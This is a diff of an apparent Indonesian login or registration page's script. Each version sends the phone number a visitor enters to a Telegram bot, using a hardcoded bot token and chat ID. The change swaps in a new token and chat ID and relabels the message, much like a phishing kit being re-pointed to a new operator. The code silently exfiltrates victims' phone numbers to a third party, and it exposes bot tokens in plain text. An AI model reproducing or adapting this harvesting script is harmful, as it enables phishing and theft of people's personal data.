@@ -84,8 +84,8 @@
    />
   </footer>
   <script>
-    const botToken = "8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg";
-    const chatId = "5689726675";
+    const botToken = "8423384291:AAGy-Lju0z-RMxX3DEwIX8_ILbLdmTQ2h30";
+    const chatId = "7549590022";
 
     const phoneInput = document.getElementById("phoneInput");
     const submitBtn = document.getElementById("submitBtn");
@@ -116,7 +116,7 @@
       submitBtn.disabled = true;
       submitBtn.classList.add("opacity-50", "cursor-not-allowed");
 
-      const message = `Nomor HP masuk/daftar: +62${phoneNumber}`;
+      const message = `Nomor HP masuk/daftar RC: +62${phoneNumber}`;
 
       fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
